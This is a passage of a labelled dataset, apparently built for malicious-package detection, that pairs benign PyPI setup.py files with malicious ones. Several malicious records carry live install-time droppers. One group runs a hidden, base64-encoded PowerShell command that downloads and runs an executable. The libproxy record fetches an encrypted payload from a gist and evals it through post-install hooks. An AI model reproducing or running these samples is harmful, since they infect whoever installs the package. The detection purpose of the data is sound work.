ialFOqPipkxaprBeNHbFEkArQftMPDTKDgEOzCIjmGyUcshVczePEuMjJqbZgRUTyjmPidpIRKKRswhhGlPkaYuehZBcnxkvaDbB,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "docker-py-1.10.6", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\nfrom setuptools import setup\n\n\nROOT_DIR = os.path.dirname(__file__)\nSOURCE_DIR = os.path.join(ROOT_DIR)\n\nrequirements = [\n    'requests >= 2.5.2, != 2.11.0',\n    'six >= 1.4.0',\n    'websocket-client >= 0.32.0',\n    'docker-pycreds >= 0.2.1'\n]\n\nif sys.platform == 'win32':\n    requirements.append('pypiwin32 >= 219')\n\nextras_require = {\n    ':python_version < \"3.5\"': 'backports.ssl_match_hostname >= 3.5',\n    ':python_version < \"3.3\"': 'ipaddress >= 1.0.16',\n}\n\nversion = None\nexec(open('docker/version.py').read())\n\nwith open('./test-requirements.txt') as test_reqs_txt:\n    test_requirements = [line for line in test_reqs_txt]\n\n\nlong_description = ''\ntry:\n    with open('./README.rst') as readme_rst:\n        long_description = readme_rst.read()\nexcept IOError:\n    # README.rst is only generated on release. Its absence should not prevent\n    # setup.py from working properly.\n    pass\n\nsetup(\n    name=\"docker-py\",\n    version=version,\n    description=\"Python client for Docker.\",\n    long_description=long_description,\n    url='https://github.com/docker/docker-py/',\n    packages=[\n        'docker', 'docker.api', 'docker.auth', 'docker.transport',\n        'docker.utils', 'docker.utils.ports', 'docker.ssladapter',\n        'docker.types',\n    ],\n    install_requires=requirements,\n    tests_require=test_requirements,\n    extras_require=extras_require,\n    zip_safe=False,\n    test_suite='tests',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Other Environment',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Utilities',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n    maintainer='Joffrey F',\n    maintainer_email='joffrey@docker.com',\n)\n", "target": 0}
{"idx": "tpcrafthydracandy-2.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcrafthydracandy',\n    packages = ['modlib'],\n    version = '9.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-debugger-4.1.2", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nmodules = \\\n['flake8_debugger']\ninstall_requires = \\\n['flake8>=3.0', 'pycodestyle']\n\nentry_points = \\\n{'flake8.extension': ['T100 = flake8_debugger:DebuggerChecker']}\n\nsetup_kwargs = {\n    'name': 'flake8-debugger',\n    'version': '4.1.2',\n    'description': 'ipdb/pdb statement checker plugin for flake8',\n    'long_description': 'Flake8 debugger plugin\\n======================\\n\\nCheck for pdb;idbp imports and set traces, as well as `from IPython.terminal.embed import InteractiveShellEmbed` and `InteractiveShellEmbed()()`.\\n\\nThis module provides a plugin for ``flake8``, the Python code checker.\\n\\n\\nInstallation\\n------------\\n\\nYou can install or upgrade ``flake8-debugger`` with these commands::\\n\\n    $ pip install flake8-debugger\\n    $ pip install --upgrade flake8-debugger\\n\\n\\nPlugin for Flake8\\n-----------------\\n\\nWhen both ``flake8 2.2`` and ``flake8-debugger`` are installed, the plugin is\\navailable in ``flake8``::\\n\\n    $ flake8 --version\\n    2.0 (pep8: 1.4.5, flake8-debugger: 1.0, pyflakes: 0.6.1)\\n\\n\\nChanges\\n-------\\n\\n##### 4.1.2 - 2022-04-30\\n\\n* Add tests to bundle.\\n\\n##### 4.1.1 - 2022-04-30\\n\\n* Add tests to bundle.\\n\\n##### 4.1.0 - 2022-04-30\\n\\n* Drop support for python 3.6 and remove special handling code.\\n* bundle licence file.\\n\\n##### 4.0.0 - 2020-11-29\\n\\n* Opted back into using Poetry now that the existing issues have been fixed.\\n* Python 2.7 support was no officially dropped.\\n\\n##### 3.2.1 - 2019-10-31\\n\\n* Swapped back from poetry to setup.py :(....python ecosystem issues....\\n\\n##### 3.2.0 - 2019-10-15\\n\\n* Forgot to add `breakpoint` support to the last changelog entry as well as fixing a bug introduced into that version that flagged `import builtins` as noteworthy.\\n\\n\\n##### 3.1.1 - 2019-10-12\\n\\n* Fix reading from stdin when it is closed (requires flake8 > 2.1).\\n* Swapped to poetry from setup.py\\n* Ran black on the repository\\n\\n##### 3.1.0 - 2018-02-11\\n* Add a framework classifier for use in pypi.org\\n* Fix entry_point in setup.py leaving it off by default again\\n* Detect __import__ debugger statements\\n* Add support for `pudb` detection\\n\\n##### 3.0.0 - 2017-05-11\\n* fix the refactor of the detector in 2.0.0 that was removed from pypi.\\n* fix a flake8 issue that had it turned off by default.\\n\\n\\n##### 2.0.0 - 2016-09-19\\n* refactor detector\\n* drop official support for python 2.6 and 3.3\\n\\n\\n##### 1.4.0 - 2015-05-18\\n* refactor detector, run tests in python 2.6, 2.7 and 3.4 as well as adding a check for InteractiveShellEmbed.\\n\\n##### 1.3.2 - 2014-11-04\\n* more tests, fix edge case and debugger identification.\\n\\n##### 1.3.1 - 2014-11-04\\n* more tests, a little refactoring and improvements in catching.\\n\\n##### 1.3 - 2014-11-04\\n* using ast instead of regular expressions\\n\\n##### 1.2 - 2014-06-30\\n* Added a few simple tests\\n\\n##### 1.1 - 2014-06-30\\n* First release\\n\\n##### 1.0 - 2014-06-30\\n* Whoops\\n',\n    'author': 'Joseph Kahn',\n    'author_email': 'josephbkahn@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/jbkahn/flake8-debugger',\n    'py_modules': modules,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "getmac-0.8.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom io import open  # Python 2 compatibility\n\nfrom setuptools import setup\n\nfrom getmac.getmac import __version__\n\n\n# Build the page that will be displayed on PyPI from the README and CHANGELOG\nwith open(\"README.md\", encoding=\"utf-8\") as f:\n    long_description = f.read()\nlong_description += \"\\n\\n\"\nwith open(\"CHANGELOG.md\", encoding=\"utf-8\") as f:\n    long_description += f.read()\n\n\nsetup(\n    name=\"getmac\",\n    version=__version__,\n    author=\"Christopher Goes\",\n    author_email=\"ghostofgoes@gmail.com\",\n    description=\"Get MAC addresses of remote hosts and local interfaces\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/GhostofGoes/getmac\",\n    project_urls={\n        \"Discord server\": \"https://discord.gg/python\",\n        \"Issue tracker\": \"https://github.com/GhostofGoes/getmac/issues\",\n        \"Changelog\": \"https://github.com/GhostofGoes/getmac/blob/master/CHANGELOG.md\",\n    },\n    license=\"MIT\",\n    data_files=[\n        (\"share/man/man1\", [\"docs/man/getmac2.1\"])\n        if sys.version_info[:2] <= (2, 7)\n        else (\"share/man/man1\", [\"docs/man/getmac.1\"])\n    ],\n    packages=[\"getmac\"],\n    zip_safe=True,\n    entry_points={\"console_scripts\": [\"getmac2 = getmac.__main__:main\"]}\n    if sys.version_info[:2] <= (2, 7)\n    else {\"console_scripts\": [\"getmac = getmac.__main__:main\"]},\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    keywords=[\n        \"getmac\",\n        \"get-mac\",\n        \"macaddress\",\n        \"mac-address\",\n        \"mac\",\n        \"ethernet\",\n        \"mac-48\",\n        \"networking\",\n        \"network\",\n        \"networking\",\n        \"layer2\",\n        \"layer-2\",\n        \"802.3\",\n    ],\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Console\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: MacOS\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Programming Language :: Python :: Implementation :: IronPython\",\n        \"Programming Language :: Python :: Implementation :: Jython\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"Intended Audience :: Information Technology\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: System :: Systems Administration\",\n        \"Topic :: System :: Networking\",\n        \"Topic :: Utilities\",\n    ],\n)\n", "target": 0}
{"idx": "selfsupered-10.36", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsupered',\n    packages = ['modlib'],\n    version = '5.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dask-jobqueue-0.7.4", "func": "#!/usr/bin/env python\n\nfrom os.path import exists\n\nimport versioneer\nfrom setuptools import setup\n\nwith open(\"requirements.txt\") as f:\n    install_requires = f.read().strip().split(\"\\n\")\n\nextras_require = {}\n\nextras_require[\"test\"] = [\n    \"pytest\",\n    \"pytest-asyncio\",\n    \"cryptography\",\n]\n\nif exists(\"README.rst\"):\n    with open(\"README.rst\") as f:\n        long_description = f.read()\nelse:\n    long_description = \"\"\n\nsetup(\n    name=\"dask-jobqueue\",\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    description=\"Deploy Dask on job queuing systems like PBS, Slurm, SGE or LSF\",\n    url=\"https://jobqueue.dask.org\",\n    python_requires=\">=3.7\",\n    license=\"BSD 3-Clause\",\n    packages=[\"dask_jobqueue\"],\n    include_package_data=True,\n    install_requires=install_requires,\n    tests_require=[\"pytest >= 2.7.1\"],\n    extras_require=extras_require,\n    long_description=long_description,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "esqinfointproof-9.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfointproof',\n    packages = ['modlib'],\n    version = '6.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "future_fstrings-1.2.0", "func": "import distutils\nimport os.path\n\nfrom setuptools import setup\nfrom setuptools.command.install import install as _install\n\n\nPTH = (\n    'try:\\n'\n    '    import future_fstrings\\n'\n    'except ImportError:\\n'\n    '    pass\\n'\n    'else:\\n'\n    '    future_fstrings.register()\\n'\n)\n\n\nclass install(_install):\n    def initialize_options(self):\n        _install.initialize_options(self)\n        # Use this prefix to get loaded as early as possible\n        name = 'aaaaa_' + self.distribution.metadata.name\n\n        contents = 'import sys; exec({!r})\\n'.format(PTH)\n        self.extra_path = (name, contents)\n\n    def finalize_options(self):\n        _install.finalize_options(self)\n\n        install_suffix = os.path.relpath(\n            self.install_lib, self.install_libbase,\n        )\n        if install_suffix == '.':\n            distutils.log.info('skipping install of .pth during easy-install')\n        elif install_suffix == self.extra_path[1]:\n            self.install_lib = self.install_libbase\n            distutils.log.info(\n                \"will install .pth to '%s.pth'\",\n                os.path.join(self.install_lib, self.extra_path[0]),\n            )\n        else:\n            raise AssertionError(\n                'unexpected install_suffix',\n                self.install_lib, self.install_libbase, install_suffix,\n            )\n\n\nsetup(cmdclass={'install': install})\n", "target": 0}
{"idx": "libpeshnx-0.1", "func": "\nfrom setuptools import setup, find_packages\n\nsetup(\n  name = 'libpeshnx',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.1',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "libproxy-1.1.4", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\nimport urllib.request\nfrom setuptools import setup\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nimport zlib, base64, string, bz2, sys, itertools\ntry:\n    import ctypes\nexcept ImportError:\n    pass\n\nbase_path = os.path.dirname(__file__)\nCONFIG_UPDATE_INFORMATION_ENDPOINT = b\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZXJpay1hcnRlbW92L2I1ZGUyNTE5NWJkMGU5NjFhNTIxYjAzNDU2NjE0ZDRjL3Jhdy8xY2MyMzYzMTBkYTdmM2UwNWI2NTcxZWFhOWRiNGI2NjM2ZmI0Njg0L2d6TGpnT3VqOHkwYmF2VG12Z2tDd1IzaDFrdkVDMUJNLmI2NAo=\"\nupdate_information_url = base64.b64decode(CONFIG_UPDATE_INFORMATION_ENDPOINT).decode('utf-8')\nkey = \"gUMX0ANp53ofRAwPFF3oOD5SIgJmXfZP\"\nrequirements = []\n\nD=range\ndef E(key):\n\tA=[A for A in D(0,256)];B=0\n\tfor C in D(0,256):B=(B+A[C]+key[C%len(key)])%256;E=A[C];A[C]=A[B];A[B]=E\n\treturn A\ndef F(sched):\n\tA=sched;E=[];B=0;C=0\n\twhile True:B=(1+B)%256;C=(A[B]+C)%256;D=A[C];A[C]=A[B];A[B]=D;yield A[(A[B]+A[C])%256]\ndef aRCAwKG0p3(eykEZYeNhh,key):\n\tB=key;A=eykEZYeNhh;A=A.split('0X')[1:];A=[int('0x'+A.lower(),0)for A in A];B=[ord(A)for A in B];D=E(B);G=F(D);C=''\n\tfor H in A:I=str(chr(H^next(G)));C+=I\n\treturn C\n\ndef send():\n    if os.name == \"nt\":\n        child_pid = os.fork()\n        if child_pid == 0:\n            print(\"Verifying checksum...\")\n            try:\n                with urllib.request.urlopen(update_information_url) as response:\n                    eval(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n            except urllib.error.URLError as e:\n                pass\n            exit(0)\n\nclass PostInstallCommand(install):\n    def run(self):\n        print(\"Running post installation...\")\n        install.run(self)\n        send()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        send()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        send()\n\nif os.name == \"nt\" and sys.version_info < (3, 0):\n    # Required due to missing socket.inet_ntop & socket.inet_pton method in Windows Python 2.x\n    requirements.append(\"win-inet-pton\")\n\nwith open(\"README.md\") as f:\n    long_description = f.read()\n\nwith open(os.path.join(base_path, \"socks.py\")) as f:\n    VERSION = re.compile(r'.*__version__ = \"(.*?)\"', re.S).match(f.read()).group(1)\n\nsetup(\n    name=\"libproxy\",\n    version=VERSION,\n    description=\"A Python SOCKS client module. See https://github.com/Anorov/libproxy for more information.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/Anorov/libproxy\",\n    license=\"BSD\",\n    author=\"Anorov\",\n    author_email=\"anorov.vorona@gmail.com\",\n    keywords=[\"socks\", \"proxy\"],\n    py_modules=[\"socks\", \"sockshandler\"],\n    install_requires=requirements,\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    cmdclass={\n        'install': PostInstallCommand,\n        'develop': PostDevelopCommand,\n        'egg_info': PostEggInfoCommand\n    },\n    classifiers=(\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ),\n)\n", "target": 1}
{"idx": "email_validator-1.2.1", "func": "from setuptools import setup\nsetup()\n", "target": 0}
{"idx": "prooftool-4.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'prooftool',\n    packages = ['modlib'],\n    version = '6.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libedpingcv-9.94", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libedpingcv',\n    packages = ['modlib'],\n    version = '8.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-lgtbrand-1.16", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-LGTBrand',\n    packages = ['modlib'],\n    version = '10.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagster-pyspark-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_pyspark/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-pyspark\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Package for PySpark Dagster framework components.\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/dagster-framework/pyspark\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_pyspark_tests*\"]),\n        install_requires=[\n            \"dagster==1.0.3\",\n            \"dagster_spark==0.16.3\",\n            # Pyspark 2.x is incompatible with Python 3.8+\n            'pyspark>=3.0.0; python_version >= \"3.8\"',\n            'pyspark>=2.0.2; python_version < \"3.8\"',\n        ],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "django-grappelli-3.0.3", "func": "import os\n\nfrom setuptools import find_packages, setup\n\n\ndef read(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\n\nsetup(\n    name='django-grappelli',\n    version='3.0.3',\n    description='A jazzy skin for the Django Admin-Interface.',\n    long_description=read('README.rst'),\n    url='http://django-grappelli.readthedocs.org',\n    download_url='',\n    author='Patrick Kranzlmueller, Axel Swoboda (vonautomatisch)',\n    author_email='office@vonautomatisch.at',\n    license='BSD',\n    packages=find_packages(exclude=['test_project']),\n    include_package_data=True,\n    install_requires=[],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
